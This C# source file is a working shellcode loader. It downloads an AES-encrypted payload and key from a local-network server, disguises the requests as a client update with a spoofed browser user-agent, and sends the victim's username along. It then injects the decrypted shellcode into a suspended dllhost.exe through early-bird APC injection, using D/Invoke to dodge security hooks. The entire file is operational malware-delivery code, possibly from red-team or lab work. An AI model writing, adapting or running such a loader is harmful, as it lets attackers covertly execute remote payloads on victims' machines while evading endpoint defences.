using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography;

namespace DInvoke_Code
{
    class Program
    {
        public static byte[] D(byte[] encryptedData, byte[] key)
        {

            // Derive the key using SHA-256 (same as in Python)
            using (SHA256 sha256 = SHA256.Create())
            {
                key = sha256.ComputeHash(key); // SHA-256 hash of the provided 'random' key
            }

            // Initialize AES in CBC mode
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = new byte[16]; // 16 bytes of 0, same as in the Python code
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.Padding = PaddingMode.PKCS7;

                // Decrypt the data
                using (ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV))
                {
                    using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (MemoryStream msOutput = new MemoryStream())
                            {
                                csDecrypt.CopyTo(msOutput);
                                byte[] decryptedData = msOutput.ToArray();

                                // Remove padding (assuming the padding method is PKCS7)
                                return RemovePadding(decryptedData);
                            }
                        }
                    }
                }
            }
        }

        // Removes the padding added during encryption
        private static byte[] RemovePadding(byte[] decryptedData)
        {
            int paddingLength = decryptedData[decryptedData.Length - 1];
            byte[] unpaddedData = new byte[decryptedData.Length - paddingLength];
            Array.Copy(decryptedData, unpaddedData, unpaddedData.Length);
            return unpaddedData;
        }

        public static byte[] DownloadFile(string url)
        {
            WebClient client = new WebClient();
            client.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36";
            //string base64 = Convert.ToBase64String(client.DownloadData(url));
            //Console.WriteLine(base64);
            return client.DownloadData(url);
        }

        static void Loader2(byte[] data)
        {
            string processPath = @"C:\Windows\System32\dllhost.exe";
            STRUCTS.STARTUPINFO si = new STRUCTS.STARTUPINFO();
            STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();

            IntPtr pointer = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "CreateProcessA");
            DELEGATES.CreateProcess CreateProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;
            bool success = CreateProcess(processPath, null, IntPtr.Zero, IntPtr.Zero, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            pointer = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            DELEGATES.VirtualAllocEx virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;
            IntPtr alloc = virtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)data.Length, 0x1000 | 0x2000, 0x40);


            pointer = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            DELEGATES.WriteProcessMemory writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;
            writeProcessMemory(pi.hProcess, alloc, data, (uint)data.Length, out UIntPtr bytesWritten);


            pointer = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "OpenThread");
            DELEGATES.OpenThread openThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.OpenThread)) as DELEGATES.OpenThread;
            IntPtr tpointer = openThread(STRUCTS.ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
            uint oldProtect = 0;


            pointer = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
            DELEGATES.VirtualProtectEx virtualProtectEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualProtectEx)) as DELEGATES.VirtualProtectEx;
            virtualProtectEx(pi.hProcess, alloc, data.Length, 0x20, out oldProtect);

            pointer = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
            DELEGATES.QueueUserAPC queueUserAPC = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.QueueUserAPC)) as DELEGATES.QueueUserAPC;
            queueUserAPC(alloc, tpointer, IntPtr.Zero);

            pointer = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "ResumeThread");
            DELEGATES.ResumeThread resumeThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;
            resumeThread(pi.hThread);


        }
        static void Main(string[] args)
        {

            byte[] scData = DownloadFile("http://192.168.0.48:8081/enc?clientupdate=yes&arch=x64&user=" + Environment.UserName);
            byte[] keyData = DownloadFile("http://192.168.0.48:8081/key?clientupdate=yes&arch=x64&user=" + Environment.UserName);

            byte[] decrypted = D(scData, keyData);
         
            Loader2(decrypted);

        }
    }
}
